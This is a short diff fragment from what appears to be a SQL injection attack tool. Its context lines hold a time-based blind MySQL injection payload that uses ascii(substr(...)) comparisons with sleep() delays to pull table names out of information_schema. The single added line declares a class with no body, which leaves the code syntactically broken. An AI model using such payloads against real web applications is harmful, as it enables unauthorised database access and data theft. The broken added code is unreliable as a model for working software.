@@ -317,6 +317,7 @@ class mysql_time_blind_technique(time_blind_technique):
         self.query_equal = query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))=${char_val:123},sleep(${sleep:2}),0)=0")
         super(mysql_time_blind_technique,self).__init__(make_request_func,sleep=sleep)
 
+class get_http_requester_evented(requester):
 
 class get_http_requester(requester):
     '''
